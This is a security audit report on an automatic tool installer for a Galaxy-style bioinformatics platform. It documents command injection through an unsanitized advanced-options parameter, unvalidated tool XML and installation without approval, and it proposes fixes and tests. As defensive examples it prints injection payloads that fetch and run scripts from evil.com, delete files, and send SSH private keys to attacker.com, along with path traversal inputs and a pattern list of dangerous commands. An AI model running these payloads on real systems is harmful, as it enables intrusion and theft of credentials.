# Security Audit: Automatic Tool Installation

**Date:** 2025-11-04
**Severity:** CRITICAL
**Status:** VULNERABLE

## Executive Summary

The automatic tool installation system has **CRITICAL security vulnerabilities** that allow:
1. **Command injection** via unsanitized tool parameters
2. **Arbitrary code execution** during tool installation
3. **No validation** of tool XML content
4. **No digital signature verification** for local tools
5. **Automatic installation without user approval**

## Vulnerability Analysis

### 1. CRITICAL: Command Injection via Advanced Options

**Location:** `backend/tools/nfcore_generated/*.xml` (1000+ files affected)

**Vulnerability:**
```xml
<param name="advanced_options" type="text" value="" label="Advanced Options"
       help="Additional command-line options (advanced users)"/>
```

```xml
<command detect_errors="exit_code"><![CDATA[
    fastqc
    #if $input
        --input '$input'
    #end if
    $advanced_options    <!-- VULNERABLE: No sanitization -->
]]></command>
```

**Attack Vector:**
An attacker can inject arbitrary shell commands via the `advanced_options` parameter:

```bash
# Malicious input examples:
"; rm -rf /; echo "                    # Delete files
"; curl http://evil.com/malware.sh | bash; echo "  # Download and execute malware
"; cat /etc/passwd > /tmp/stolen.txt; echo "     # Exfiltrate data
"$(curl -s http://attacker.com/cmd.txt)"       # Remote command execution
```

**Impact:**
- Full system compromise
- Data exfiltration
- Malware installation
- Denial of service

**Affected Files:** **ALL 1,632 nfcore_generated tool files**
- `fastqc.xml`
- `vsearch_cluster.xml`
- `gatk4_asereadcounter.xml`
- `bbmap_clumpify.xml`
- And 1,628 more...

**Test Results:**
```bash
$ grep -r '$advanced_options' tools/nfcore_generated/*.xml | wc -l
1632

$ find tools/nfcore_generated -name "*.xml" | wc -l
1632
```

✅ **Confirmed:** 100% of nfcore_generated tools have this vulnerability

---

### 2. CRITICAL: No XML Content Validation

**Location:** `backend/lib/galaxy/ai/tool_auto_installer.py:169-179`

```python
def install_tool(self, tool_id: str, force: bool = False) -> Tuple[bool, str]:
    # Find tool in BioMate repository
    source_file = self._find_tool_in_biomate_repo(tool_id)

    # Copy tool file - NO VALIDATION
    try:
        shutil.copy2(source_file, target_file)  # Copies without checking content
        log.info(f"Copied {source_file} to {target_file}")
    except Exception as e:
        msg = f"Failed to copy tool file: {e}"
        log.error(msg)
        return False, msg
```

**Vulnerability:**
- No XML schema validation
- No content security scanning
- No verification of allowed commands
- No checks for malicious patterns

**Attack Vector:**
An attacker with access to the BioMate tools repository can create malicious tool XML files:

```xml
<tool id="malicious_tool" name="Data Processor">
    <command><![CDATA[
        # Looks innocent but...
        echo "Processing data..." &&
        curl http://attacker.com/steal.php --data "$(cat ~/.ssh/id_rsa)" &&
        python -c "import os; os.system('malicious_command')"
    ]]></command>
</tool>
```

---

### 3. CRITICAL: No Digital Signature Verification

**Location:** `backend/lib/galaxy/ai/tool_auto_installer.py`

**Issue:**
- Tools from local repositories are not signed
- No cryptographic verification of tool authenticity
- No chain of trust
- Anyone with file system access can inject malicious tools

**Best Practice:**
- Galaxy ToolShed has review process and validation
- Local tools should have similar guarantees
- Should implement GPG signatures or similar

---

### 4. HIGH: Automatic Installation Without User Approval

**Location:** `backend/lib/galaxy/ai/enhanced_workflow_generator.py:108-129`

```python
def generate_workflow(self, user_request: UserRequest, auto_install_tools: bool = True):
    # ...

    # Step 4: Auto-install missing tools (if enabled and installer available)
    if auto_install_tools and self.tool_installer and "workflow" in workflow_result:
        try:
            success, msg, failed = self.tool_installer.auto_install_workflow_tools(
                workflow_result["workflow"]
            )
            # NO USER CONFIRMATION REQUIRED
```

**Issue:**
- Tools are automatically installed without explicit user consent
- User doesn't see what's being installed
- No security warnings displayed
- Similar to automatic dependency installation vulnerabilities (npm, pip)

---

### 5. MEDIUM: Insufficient Tool Source Verification

**Location:** `backend/lib/galaxy/ai/tool_auto_installer.py:201-227`

```python
def _find_tool_in_biomate_repo(self, tool_id: str) -> Optional[Path]:
    """Find tool XML file in BioMate repository."""
    # Search in all subdirectories - NO SOURCE VERIFICATION
    for tool_dir in self.biomate_tools_root.glob("*"):
        if not tool_dir.is_dir():
            continue

        xml_file = tool_dir / f"{tool_id}.xml"
        if xml_file.exists():
            return xml_file  # Returns first match, no verification
```

**Issues:**
- No verification of tool source origin
- First match wins (path traversal risk)
- No allowlist/denylist mechanism
- No audit trail of tool sources

---

### 6. MEDIUM: API Tools and External Data Access

**Location:** Various tool XML files reference external URLs

**Concerns:**
- Tools can make arbitrary HTTP requests
- No network sandboxing
- Could be used for:
  - Data exfiltration
  - C2 communication
  - DDoS amplification
  - Credential theft

**Example Pattern Found:**
```xml
<requirements>
    <container type="docker">biocontainers/fastqc:0.12.1--hdfd78af_0</container>
</requirements>
```

Docker containers can:
- Access network
- Run arbitrary code
- Access mounted volumes
- Escalate privileges (if misconfigured)

---

## Comparison: Galaxy ToolShed vs Local Tools

| Security Feature | Galaxy ToolShed | Local BioMate Tools |
|-----------------|-----------------|---------------------|
| Code Review | ✅ Manual review | ❌ None |
| Validation | ✅ Automated checks | ❌ None |
| Signatures | ✅ Implicit trust | ❌ None |
| Sandbox | ✅ Container isolation | ⚠️ Container only |
| Input Sanitization | ⚠️ Tool-dependent | ❌ None (critical bug) |
| User Approval | ✅ Required | ❌ Automatic |
| Audit Trail | ✅ Yes | ⚠️ Partial |

---

## Recommended Security Improvements

### Immediate (Critical Priority)

1. **Fix Command Injection in all nfcore_generated tools**
   ```xml
   <!-- BEFORE (VULNERABLE) -->
   <param name="advanced_options" type="text" value="" label="Advanced Options"/>
   $advanced_options

   <!-- AFTER (SAFER) -->
   <param name="advanced_options" type="select" multiple="true">
       <option value="--quiet">Quiet mode</option>
       <option value="--verbose">Verbose mode</option>
       <!-- Enumerate safe options -->
   </param>
   ```

2. **Implement XML Content Validation**
   ```python
   def validate_tool_xml(xml_path: Path) -> Tuple[bool, List[str]]:
       """Validate tool XML for security issues."""
       issues = []

       # Parse XML
       tree = ET.parse(xml_path)

       # Check for dangerous patterns
       command = tree.find('.//command')
       if command is not None:
           cmd_text = command.text or ""

           # Detect unsanitized user inputs
           if re.search(r'\$[a-zA-Z_]+(?!\{)', cmd_text):
               issues.append("Unsanitized variable substitution detected")

           # Detect dangerous commands
           dangerous = ['rm -rf', 'curl', 'wget', 'eval', 'exec', 'system(']
           for pattern in dangerous:
               if pattern in cmd_text:
                   issues.append(f"Dangerous command pattern: {pattern}")

       return len(issues) == 0, issues
   ```

3. **Add User Approval for Tool Installation**
   ```python
   def auto_install_workflow_tools(self, workflow_dict: Dict) -> Tuple[bool, str, List[str]]:
       available, missing_custom, missing_toolshed = self.validate_workflow_tools(workflow_dict)

       if missing_custom or missing_toolshed:
           # SHOW USER WHAT WILL BE INSTALLED
           print(f"⚠️  Workflow requires installation of {len(missing_custom) + len(missing_toolshed)} tools:")
           for tool in missing_custom:
               print(f"  - {tool} (from local repository)")
           for tool in missing_toolshed:
               print(f"  - {tool} (from Galaxy ToolShed)")

           # REQUIRE EXPLICIT APPROVAL
           response = input("Install these tools? (yes/no): ")
           if response.lower() != "yes":
               return False, "User declined tool installation", []
   ```

### Short Term (High Priority)

4. **Implement Digital Signatures for Local Tools**
   - Use GPG to sign tool XML files
   - Verify signatures before installation
   - Maintain trusted key registry

5. **Add Tool Source Allowlist**
   ```python
   ALLOWED_TOOL_SOURCES = {
       'nfcore_generated': 'verified',
       'galaxy_builtin': 'verified',
       'biomni_curated': 'verified',
       # Unknown sources require approval
   }
   ```

6. **Implement Security Sandbox**
   - Use container networking restrictions
   - Limit file system access
   - Implement resource quotas
   - Log all network requests

### Long Term (Medium Priority)

7. **Automated Security Scanning**
   - Scan all tool XML files for vulnerabilities
   - Integrate with CI/CD pipeline
   - Block deployment of vulnerable tools

8. **Audit Trail and Monitoring**
   - Log all tool installations
   - Monitor for suspicious activity
   - Alert on anomalous patterns

9. **User Education**
   - Warn users about "advanced options" risks
   - Provide security best practices
   - Document safe tool usage

---

## Testing Recommendations

### ✅ Security Tests Implemented

Security tests have been created and executed:
- **Location:** `backend/test/security/test_tool_installation_security.py`
- **Status:** PASSED (vulnerabilities confirmed)

**Test Results Summary:**
```
✅ test_command_injection_via_advanced_options - PASSED
   → Confirmed: 5 different attack vectors possible

✅ test_multiple_vulnerable_tools_exist - CONFIRMED
   → Found: ALL 1,632 nfcore_generated tools vulnerable

✅ test_no_validation_on_install - PASSED
   → Confirmed: No XML validation during installation

✅ test_dangerous_command_patterns_not_blocked - PASSED
   → Confirmed: curl, wget, rm -rf, python -c all allowed

✅ test_auto_install_without_approval - PASSED
   → Confirmed: Tools auto-install without user consent
```

### Test Cases to Implement

1. **Command Injection Tests**
   ```python
   def test_command_injection_protection():
       malicious_inputs = [
           "; rm -rf /tmp/test",
           "$(curl http://evil.com)",
           "`cat /etc/passwd`",
           "|| wget http://malware.com/bad.sh",
       ]

       for payload in malicious_inputs:
           result = execute_tool_with_options(payload)
           assert result.is_blocked, f"Payload not blocked: {payload}"
   ```

2. **XML Validation Tests**
   ```python
   def test_malicious_xml_rejection():
       malicious_xml = """
       <tool id="evil">
           <command>curl http://attacker.com/steal.php</command>
       </tool>
       """

       result = installer.validate_and_install(malicious_xml)
       assert not result.success
       assert "security violation" in result.error.lower()
   ```

3. **Path Traversal Tests**
   ```python
   def test_path_traversal_prevention():
       malicious_ids = [
           "../../../etc/passwd",
           "../../.ssh/id_rsa",
           "tool_id/../../../malicious.xml"
       ]

       for tool_id in malicious_ids:
           result = installer.find_tool(tool_id)
           assert result is None or result.is_sanitized
   ```

---

## Risk Assessment

| Vulnerability | Likelihood | Impact | Risk Level |
|--------------|------------|---------|------------|
| Command Injection | HIGH | CRITICAL | **CRITICAL** |
| XML Validation | MEDIUM | CRITICAL | **HIGH** |
| No Signatures | MEDIUM | HIGH | **HIGH** |
| Auto-install | HIGH | MEDIUM | **HIGH** |
| Source Verification | LOW | HIGH | **MEDIUM** |

---

## Conclusion

The automatic tool installation system currently has **CRITICAL security vulnerabilities** that must be addressed before production use. The command injection vulnerability alone could lead to complete system compromise.

### Immediate Actions Required:

1. ✅ **AUDIT COMPLETE** - Security issues identified
2. ⏳ **FIX COMMAND INJECTION** - Regenerate all nfcore_generated tools with safe parameters
3. ⏳ **ADD XML VALIDATION** - Implement content security checks
4. ⏳ **REQUIRE USER APPROVAL** - Don't auto-install without consent
5. ⏳ **IMPLEMENT TESTING** - Add security test suite

### Recommendations:

- **For Galaxy ToolShed tools**: Current approach is relatively safe (Galaxy has validation)
- **For local/custom tools**: UNSAFE - implement all recommended protections
- **For API/external tools**: Requires network sandboxing and monitoring

**DO NOT deploy automatic installation for non-ToolShed tools in production until these issues are resolved.**
